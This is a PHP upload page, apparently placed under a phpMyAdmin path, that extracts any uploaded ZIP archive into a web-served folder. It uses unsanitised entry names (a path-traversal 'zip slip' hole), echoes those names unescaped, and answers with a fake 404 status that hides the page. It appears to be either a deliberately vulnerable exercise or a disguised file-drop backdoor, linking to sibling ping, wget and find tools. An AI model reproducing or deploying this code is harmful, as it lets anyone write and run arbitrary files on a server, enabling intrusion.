<?php
header("HTTP/1.1 404 Not Found");
$debug="";
$uploaddir = getcwd()."/upload/";
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);

$file_parts = pathinfo($uploadfile);
if($file_parts['extension']=='zip')
{

	if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
		$debug.="<pre> File uploaded</pre>";
		 $zip = zip_open($uploadfile);
            // find entry
         if ($zip) {
			  while ($zip_entry = zip_read($zip)) {
				// Get name of directory entry
					$debug.="<pre>File: " . zip_entry_name($zip_entry) . "</pre>";
				
					$debug.="<pre>Writing to :".$uploaddir.zip_entry_name($zip_entry)."</pre>";

				if (zip_entry_open($zip, $zip_entry)) {
				 
					if(FALSE===file_put_contents($uploaddir.zip_entry_name($zip_entry),zip_entry_read($zip_entry)))
					{
							$debug.="<pre> unable to write file</pre>";
					}
				  zip_entry_close($zip_entry);
				}
    			
			  }
			  zip_close($zip);
			}


	}
	
	
	
	
}






?>




<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>SVG</title>
    <link rel="stylesheet" href="/bulma.css">
  </head>
  <body>
  	<nav class="navbar" role="navigation" aria-label="main navigation">
		<div id="navbarBasicExample" class="navbar-menu">
		<div class="navbar-start">
		  <a class="navbar-item" href="/phpmyadmin/">
			Home
		  </a>

		  <a class="navbar-item" href="/phpmyadmin/docs.php">
			Documentation
		  </a>

		  <div class="navbar-item has-dropdown is-hoverable">
			<a class="navbar-link">
			  Tools
			</a>

			<div class="navbar-dropdown">
			  <a class="navbar-item" href="/phpmyadmin/ping.php">
				ping
			  </a>
			  <a class="navbar-item" href="/phpmyadmin/wget.php">
				wget
			  </a>			  
			  <a class="navbar-item" href="/phpmyadmin/find.php">
				find
			  </a>
			</div>
		  </div>
		</div>
	  </div>
	</nav>
  
  
  <section class="section">
    <div class="container">
      <h1 class="title">
      ZIP
      </h1>


		<form enctype="multipart/form-data" method="POST" action="/phpmyadmin/zip.php">
		
		
			<div class="control">
			  <input class="input" type="file" placeholder="command input" name="userfile">
			</div><br/>
			<div class="control">
				<button class="button is-primary">Submit</button>
			</div>
		
		
		</form>

		<p>Output:</p>
		<p>

<?php echo $debug; ?>

		</p>

    </div>

	
	
	
  </section>
  </body>
</html>